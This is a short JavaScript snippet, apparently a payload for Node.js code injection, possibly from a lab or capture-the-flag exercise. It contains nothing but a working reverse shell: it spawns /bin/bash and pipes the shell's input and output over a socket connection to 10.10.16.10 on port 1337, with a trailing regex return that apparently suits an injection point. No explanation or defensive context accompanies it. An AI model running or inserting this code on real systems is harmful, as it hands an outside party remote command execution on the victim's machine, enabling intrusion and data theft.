(function(){
  var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/bash",[]);
  var client = new net.Socket();
  client.connect(1337,"10.10.16.10",function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/;
})();
